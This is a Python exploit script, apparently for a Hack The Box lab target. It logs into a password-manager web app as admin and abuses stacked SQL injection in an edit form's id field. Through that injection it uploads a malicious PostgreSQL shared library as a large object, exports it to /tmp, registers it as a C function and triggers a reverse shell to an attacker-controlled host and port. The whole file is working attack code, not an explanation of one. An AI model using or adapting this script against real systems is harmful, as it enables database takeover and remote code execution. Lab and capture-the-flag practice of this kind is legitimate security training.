import requests
import random
import string
from urllib.parse import quote_plus
import math

# Base URL of the vulnerable web application
BASE_URL = "http://10.129.95.74:8080"
# Attacker's IP and port for the reverse shell connection
LHOST = "10.10.14.39"
LPORT = 4444
# Credentials for the admin user
USERNAME = "admin"
PASSWORD = "Hack" # Replace this with the password used when resetting the admin password

# Create a persistent HTTP session
s = requests.Session()

# Log into the web application with provided credentials
r = s.post(
    f"{BASE_URL}/login",
    headers = {"Content-Type":"application/x-www-form-urlencoded"},
    data = f"username={USERNAME}&password={PASSWORD}"
)

# Check if login was successful
if "My Passwords</h1>" in r.text:
    print("[*] Logged in")
else:
    print("Could not log in. Check the credentials!\nUse the same password when you reset it for the admin user.")
    exit(1)

# Function acting as an SQL injection oracle to send crafted payloads
def oracle(s, q):
    r = s.post(
        f"{BASE_URL}/dashboard/edit",
        headers = {"Content-Type":"application/x-www-form-urlencoded"},
        data = f"username={USERNAME}&password={PASSWORD}&title=Hackthebox&id={quote_plus(q)}"
    )
    # Return True if the injection executed successfully
    return "Password edited!" in r.text

# Read the malicious PostgreSQL shared library (reverse shell)
with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

# Randomly select a large object ID (LOID) to store binary data in PostgreSQL
loid = random.randint(50000,60000)

# Step 1: Create a new large object in PostgreSQL
if oracle(s, f"1;SELECT lo_create({loid})--"):
    print(f"[*] Created large object with ID: {loid}")
else:
    print("[!] Could not create large object!")
    exit(1)

# Step 2: Upload the binary file into the large object in chunks of 2048 bytes
for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    if oracle(s, f"1;SELECT lo_put({loid}, {pageno*2048}, decode($${page.hex()}$$,$$hex$$))--"):
        print(f"[*] Uploading Page: {pageno}, Offset: {pageno*2048}")
    else:
        print("[!] Failed to upload the page!")
        exit(1)

# Step 3: Export the large object to a file on the server and define a new PostgreSQL C function
query  = f"1;SELECT lo_export({loid}, $$/tmp/pg_rev_shell.so$$);"
query += f"SELECT lo_unlink({loid});"  # Remove large object after export
query += "DROP FUNCTION IF EXISTS rev_shell;"  # Clean up any existing function
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS $$/tmp/pg_rev_shell$$, $$rev_shell$$ LANGUAGE C STRICT;"  # Register malicious C function
query += f"SELECT rev_shell($${LHOST}$$, {LPORT})--"  # Trigger reverse shell connection

# Step 4: Execute the final payload
if oracle(s, query):
    print("[*] Reverse shell deployed. Check your listener!")
else:
    print("[!] Exploit failed!")